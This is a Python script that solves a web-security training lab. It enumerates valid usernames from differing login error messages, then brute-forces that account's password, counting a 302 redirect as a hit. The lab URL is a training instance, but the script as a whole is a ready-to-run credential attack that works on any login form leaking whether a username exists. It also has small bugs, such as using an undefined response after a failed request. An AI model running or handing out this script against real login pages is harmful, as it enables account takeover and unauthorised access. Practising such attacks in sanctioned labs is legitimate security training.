######################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 25/8/2023
#
# Lab: Username enumeration via different responses
#
# Steps: 1. Obtain a valid username via different error messages
#        2. Brute force password of that valid username
#
######################################################################


###########
# imports
###########
import requests
import re
import time
from colorama import Fore


#############################
# Global Variables
#############################
FAILED_USERS = []
FAILED_USERS_COUNTER = 0
FAILED_PASSWORDS = []
FAILED_PASSWORDS_COUNTER = 0


#####################################
# Function to print in a nice format
#####################################
def print_progress(elapsed_time, fail_counter, success_counter, total_counts, text):
    print(Fore.YELLOW + "Elapsed: " + Fore.WHITE + str(elapsed_time) + " minutes || " + Fore.RED + "Failed: " + Fore.WHITE +
          str(fail_counter) + " || " + Fore.WHITE + f"Trying ({success_counter}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


#################################
# Function to get valid username
#################################
def get_valid_user(start_time, url, usernames):
    global FAILED_USERS
    global FAILED_USERS_COUNTER

    print(Fore.WHITE + "[#] Enumerate usernames..")

    # get the number of all usernames
    total_users = len(usernames)  
    
    for index, user in enumerate(usernames):
        # set data to send via POST
        data = {
            "username": user,
            "password": "no important now"
        }

        # calculate the elapsed time
        elapsed_time = (int((time.time() - start_time) / 60))

        # print the updated information
        print_progress(elapsed_time, FAILED_USERS_COUNTER, index, total_users, user)

        try:  
            # send a login request
            response = requests.post( url, data, allow_redirects=False, timeout=5)

        except:
            # update the fail counter
            FAILED_USERS_COUNTER += 1  
            # save the failed username to try it later
            FAILED_USERS.append(user)
        
        # if response is OK
        if response.status_code == 200:
            # search for pattern
            check_pattern = re.findall("Invalid username", response.text)  
            
            # if pattern not found
            if len(check_pattern) == 0:  
                # valid user
                return user  
            
            else:
                continue
        
    # if no users are found
    return None


##################################
# Function to bure force password
##################################
def brute_force_password(start_time, url, valid_user, passwords):
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER

    print(Fore.GREEN + "\n\n✅ Valid user: " + valid_user)
    print(Fore.WHITE + "[#] Brute forcing password..")
    
    # get the number of all passwords
    total_passwords = len(passwords)  

    for (index, password) in enumerate(passwords):
        # calculate the elapsed time
        elapsed_time = (int((time.time() - start_time) / 60))
        
        print_progress(elapsed_time, FAILED_PASSWORDS_COUNTER, index, total_passwords, password)
        
       # set data to send via POST
        data = {
            "username": valid_user,
            "password": password
        }

        try:  
            # try to login
            response = requests.post(url, data, allow_redirects=False, timeout=5)
            
        except:
            # update the failed counter
            FAILED_PASSWORDS_COUNTER += 1         
            # save the failed password to try it later
            FAILED_PASSWORDS.append(password)
        
        # if a redirect occurred, it indicate a valid password 
        if response.status_code == 302: 
            return password

        else:
            continue
    
    # if no passwords are found
    return None


##################################
# Function to save results
##################################
def save_results(elapsed_time, file_name, valid_user, valid_password):
    global FAILED_USERS
    global FAILED_USERS_COUNTER
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER

    # results to save to a file
    to_save = f"""
    ✅ Finished in: {elapsed_time} minutes \n\n\
    Username: {valid_user}, Password: {valid_password} \n\n\
    [!] Failed users count: {FAILED_USERS_COUNTER} \n\
    [!] Failed users: {FAILED_USERS} \n\n\
    [!] Failed passwords count: {FAILED_PASSWORDS_COUNTER} \n\
    [!] Failed passwords: {FAILED_PASSWORDS} \n\n"""
    
    try:
        # create a file to save the results in
        new_file = open(file_name, "x")
        
        # write the results to the file
        new_file.write(to_save)
        
        print(Fore.YELLOW + f"\nResults was saved to: {file_name}")
    
    except:
        print(Fore.RED + "Couldn't create the file to save results. It may be already existed")


###########
# Main
###########

# change this to your lab URL
url = "https://0a1f00560408d71a810d11af00bb001e.web-security-academy.net/login"

# change the file path of the password list
usernames = open("/home/ahmed/users", 'rt').read().splitlines()

# change the file path of the username list
passwords = open("/home/ahmed/passwords", 'rt').read().splitlines()

# capture the time before enumeration
start_time = time.time()  

# start the enumeration
valid_user = get_valid_user(start_time, url, usernames)  

# if a valid username was found
if valid_user != None:  
    # brute force his password
    valid_password = brute_force_password(start_time, url, valid_user, passwords)  
    
    # if a valid password was found
    if valid_password != None: 
        print(Fore.GREEN + "\n\n✅ Login successfully: " + Fore.WHITE + " username: " +
              Fore.GREEN + valid_user + Fore.WHITE + ", password: " + Fore.GREEN + valid_password)
        
    else:  # no valid password was found
        print(Fore.RED + "\n[!] Couldn't find a valid password")
        
else:
    print(Fore.RED + "\n[!] Couldn't find a valid username")

# calculate the elapsed time
elapsed_time = int((time.time() - start_time) / 60)  

print(Fore.GREEN + "\nFinished in: " + Fore.WHITE + str(elapsed_time) + " minutes")

# save the results
save_results(elapsed_time, "results", "", "")

# print the failed users
print(Fore.RED + "\nFailed users count: " + Fore.WHITE + str(FAILED_USERS_COUNTER))
print(Fore.RED + "Failed users: " + Fore.WHITE + "[ " + ", ".join(FAILED_USERS) + " ]")

# print the failed passwords
print(Fore.RED + "\nFailed passwords count: " + Fore.WHITE + str(FAILED_PASSWORDS_COUNTER))
print(Fore.RED + "Failed passwords: " + Fore.WHITE + "[ " + ", ".join(FAILED_PASSWORDS) + " ]")
